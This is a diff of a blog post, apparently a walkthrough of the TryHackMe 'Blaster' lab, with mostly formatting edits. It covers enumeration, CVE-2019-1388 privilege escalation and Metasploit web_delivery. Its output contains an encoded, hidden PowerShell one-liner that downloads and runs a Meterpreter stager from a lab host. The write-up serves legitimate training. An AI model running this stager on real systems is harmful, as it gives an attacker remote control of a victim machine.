@@ -6,22 +6,21 @@ categories:
   - TryHackMe
 ---
 
-{{< image src="/thm/blaster/blaster.jpeg" alt="blaster" position="left" style="width: 200px;" >}}
+{{< post-img src="blaster.jpeg" alt="blaster" >}}
 
 ## Enumeration
 
-### nmap
-```
+```bash
 PORT     STATE SERVICE            REASON  VERSION
 80/tcp   open  http               syn-ack Microsoft IIS httpd 10.0
 |_http-title: IIS Windows Server
-| http-methods: 
+| http-methods:
 |   Supported Methods: OPTIONS TRACE GET HEAD POST
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
 
 3389/tcp open  ssl/ms-wbt-server? syn-ack
-| rdp-ntlm-info: 
+| rdp-ntlm-info:
 |   Target_Name: RETROWEB
 |   NetBIOS_Domain_Name: RETROWEB
 |   NetBIOS_Computer_Name: RETROWEB
@@ -64,9 +63,9 @@ Host script results:
 
 ```
 
-### ffuf (using big.txt)
+ffuf (using big.txt)
 
-```
+```bash
 retro                   [Status: 301, Size: 150, Words: 9, Lines: 2]
 ```
 
@@ -74,8 +73,8 @@ As a big fan of videogames and a retro games enjoyer this page was just amazing
 
 the user `wade` seem to be a very cool guy
 
-```
-I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie! 
+```text
+I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie!
 ```
 google "wade book character" if you don't know about `Ready player one`
 
@@ -95,15 +94,16 @@ THM{ready_player_one}
 
 ugh...internet explorer
 
-For this part I tried many times to check the browser's history but could only see today's history wich was not useful
+For this part I tried many times to check the browser's history but could only see today's history
+which was not useful
 
-I went to ask for help and got 
+I went to ask for help and got
 
 [cve-2019-1388](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388)
 
-And according to the summary 
+And according to the summary...*puts on glasses
 
-```
+```text
 To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take control of an affected system.
 ```
 
@@ -115,7 +115,7 @@ click the `versign` link after 'Issued by:'
 
 Again I had issues making this part work...
 
-Got a 404 error on the link where it was supposed to serve a page 
+Got a 404 error on the link where it was supposed to serve a page
 
 We normally save it as `C:\Windows\System32\*.*` (filename)
 
@@ -127,7 +127,7 @@ hoping this would work...
 
 We use `exploit/multi/script/web_delivery`
 
-```
+```bash
 msf6 exploit(multi/script/web_delivery) > show targets
 
 Exploit targets:
@@ -154,7 +154,8 @@ we set the payload to `windows/meterpreter/reverse_http`
 then we run as a job with `run -j`
 
 we get this
-```
+
+```bash
 [*] Run the following command on the target machine:
 powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABpAGwAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAaQBsAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAaQBsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADIAMgA2AC4AMgAwADMAOgA4ADAAOAAwAC8AMwA2AHUAMwBuAEEASgBmAG8ASQBRADYATwB1AEkALwBrADcAQQA0AGYAVwBmAHEAOQBxAGgAMwBQAFMATAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADIAMgA2AC4AMgAwADMAOgA4ADAAOAAwAC8AMwA2AHUAMwBuAEEASgBmAG8ASQBRADYATwB1AEkAJwApACkAOwA=
 ```
@@ -169,7 +170,7 @@ with this room
 And tryhackme seems to be aware, here is from [known issues](https://help.tryhackme.com/miscellaneous/known-issues-with-rooms)
 
 
-```
+```text
 Blaster
 
 Issue: No web-browser history for the CVE.
@@ -186,6 +187,6 @@ As long as issues are not fixed you might as well have this one for free
 
 Anyway this was a fun trial...hope this is fixed soon
 
-I strongly recommand trying `retro` room later as its similar to this one but HARDER
+I strongly recommend trying `retro` room later as its similar to this one but HARDER
 
-I will do it when I am ready...(kek)
+I will do it when I am **ready**...(kek)
